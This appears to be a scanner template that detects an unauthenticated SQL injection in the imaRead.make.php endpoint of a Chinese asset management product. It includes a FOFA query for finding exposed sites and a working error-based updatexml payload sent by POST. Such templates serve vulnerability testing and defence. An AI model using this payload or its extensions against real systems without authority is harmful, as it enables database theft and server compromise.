id: baiyiyun-imaread-make-sqli

info:
  name: 百易云资管系统-imaRead.make.php-SQL注入漏洞
  author: avic123
  severity: high
  verified: true
  description: |
    百易云资产管理运营系统 imaRead.make.php 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    fofa：body="media/css/uniform.default.css" && body="资管云" || body="不要着急，点此" || title="资管云"

  reference:
    - https://cn-sec.com/archives/4227144.html
  tags: baiyiyun,sqli
  created: 2025/08/15

rules:
  r0:
    request:
      method: POST
      path: /adminx/imaRead.make.php?act=remake
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)
    expression: |
      response.status == 200 && response.body.bcontains(b"XPATH syntax error:") && response.body.bcontains(b'25d55ad283aa400af464c76d713c07a')

expression: r0()
